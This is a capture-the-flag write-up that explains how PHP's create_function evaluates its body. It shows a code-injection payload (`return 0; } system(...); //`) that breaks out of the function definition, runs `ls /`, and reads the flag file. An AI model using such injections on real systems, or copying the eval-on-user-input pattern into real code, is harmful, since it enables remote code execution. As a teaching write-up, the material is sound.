# I <3 PHP (100 points)

I created this challenge in an attempt to highlight the surprising
function implementations that the PHP language has to offer.

The challenge consists of the following code :
```
if (isset($_GET['code'])) {
  $new_func = create_function('', $_GET['code']);
  if ($_GET['code'] === "echo 'hello world';") {
    $new_func();
  }
}
```

Basically, it creates a function through `create_function` using code
specified through the arguments.

The function is then only executed *if* the code is `echo 'hello world';`.

By reading [PHP's manual on create_function](http://www.php.net/manual/en/function.create-function.php), you can see the following statement :

```
Caution
This function internally performs an eval() and as such has the same security issues as eval(). Additionally it has bad performance and memory usage characteristics.
If you are using PHP 5.3.0 or newer a native anonymous function should be used instead.
```

Essentially, create_function is an eval call which does the following :

```
function create_function($args, $code) {
  eval("
    function lambda_1 ($args) { $code }
  ");
  return 'lambda_1';
}
```

In a normal use case, the lambda_1 function is only defined. Nothing is executed.

But since we can control the body of the function, we can escape the definition,
and execute anything we want. Here's an example :

Let's inject the code `return 0; } echo 'outside'; //`

This will result in the following eval call :
```
eval("
  function lambda_1 () { return 0; } echo 'outside'; // }
");
```

We end up with a `lambda_1` definition containing `return 0;` and
an `echo 'outside';` statement which is executed.

We've successfully executed PHP code inside the `create_function` function.

Now let's call some system functions and find the flag :

```
# return 0; } system("ls /"); //

bin
boot
dev
etc
get_your_free_flag_here.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```
# return 0; } system("cat /get_your_free_flag_here.txt"); //

// Congratz! PHP is such a fun language to break :D
// But good thing they deprecated this shit...
// http://php.net/manual/en/function.create-function.php

// Anyway, here's your flag :
HF-ca724db2d49bb280ca644ed39f09ed65
```
